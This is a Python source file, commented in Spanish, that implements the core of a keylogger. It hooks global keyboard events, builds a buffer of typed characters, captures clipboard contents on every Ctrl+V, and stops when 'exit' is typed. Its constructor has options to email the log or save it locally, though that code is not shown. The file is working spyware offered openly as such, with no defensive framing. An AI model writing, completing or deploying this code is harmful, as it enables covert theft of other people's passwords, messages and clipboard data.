import pyperclip

class KeyloggerCore:
    """
    keylogger: eventos globales de teclado,
    formatea teclas, detecta 'exit' para detenerse (sin grabar esa palabra),
    y detecta Ctrl+V (pegado desde el portapapeles).
    """

    def __init__(self, enviar_correo: bool, guardar_local: bool):
        self.enviar_correo = enviar_correo
        self.guardar_local = guardar_local
        self.buffer = ""   
        self.running = True  

    def callback(self, event):
        """
        Se ejecuta en cada tecla:
          1) Si event.Ascii == 22 → Ctrl+V: pega texto (pyperclip.paste()).
          2) Si event.Ascii == 13 → ENTER: añade '\n'.
          3) Si event.Ascii == 8  → BACKSPACE: borra último carácter del buffer.
          4) Si 32 <= event.Ascii <= 126 → carácter imprimible: añade con chr().
          5) Tras cada inserción, si el buffer termina en "exit" (minusculas o mayúsculas),
             lo quita del buffer y pone self.running = False.
        """
        try:
            # 1) Ctrl+V
            if event.Ascii == 22:
                pasted = pyperclip.paste()
                self.buffer += f"[PASTE: {pasted}]"
            else:
                # 2) ENTER
                if event.Ascii == 13:
                    self.buffer += "\n"
                # 3) BACKSPACE
                elif event.Ascii == 8:
                    if len(self.buffer) > 0:
                        self.buffer = self.buffer[:-1]
                # 4) Carácter imprimible (ASCII 32–126)
                elif 32 <= event.Ascii <= 126:
                    self.buffer += chr(event.Ascii)

            # 5) Detectar "exit" al final y detener
            buf_lower = self.buffer.lower()
            if buf_lower.endswith("exit"):
                # Quitar la palabra "exit" del buffer
                self.buffer = self.buffer[:-4]
                self.running = False

        except Exception:

            pass
